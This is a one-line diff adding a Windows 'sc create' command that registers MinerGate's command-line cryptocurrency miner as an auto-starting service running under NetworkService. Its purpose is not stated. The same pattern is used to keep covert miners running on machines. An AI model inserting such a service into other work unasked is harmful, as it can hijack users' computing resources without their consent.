@@ -1,0 +1,1 @@
+sc create Minergate-cli binpath="C:\Program Files\MinerGate\MGs-cli.exe" type=own start=auto obj= "NT Authority\NetworkService" password= ""
